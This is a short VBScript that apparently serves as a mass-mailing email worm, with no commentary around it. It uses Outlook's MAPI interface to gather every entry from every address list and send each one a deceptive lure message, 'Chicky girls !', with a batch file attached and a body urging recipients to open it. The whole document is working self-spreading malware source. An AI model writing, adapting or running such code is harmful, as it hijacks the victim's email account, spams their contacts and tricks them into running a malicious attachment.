on error resume next
dim a,b,c,d,e
set a = Wscript.CreateObject("Wscript.Shell")
set b = CreateObject("Outlook.Application")
set c = b.GetNameSpace("MAPI")
for y = 1 To c.AddressLists.Count
set d = c.AddressLists(y)
x = 1
set e = b.CreateItem(0)
for o = 1 To d.AddressEntries.Count
f = d.AddressEntries(x)
e.Recipients.Add f
x = x + 1
next
e.Subject = "Chicky girls !"
e.Body = " Wanna know everything about girls and how to get them ??? Use the attachment to register to our zine and follow the instructions ! "
e.Attachments.Add ("c:\windows\DV£\nrg.bat")
e.DeleteAfterSubmit = False
e.Send
f = ""
next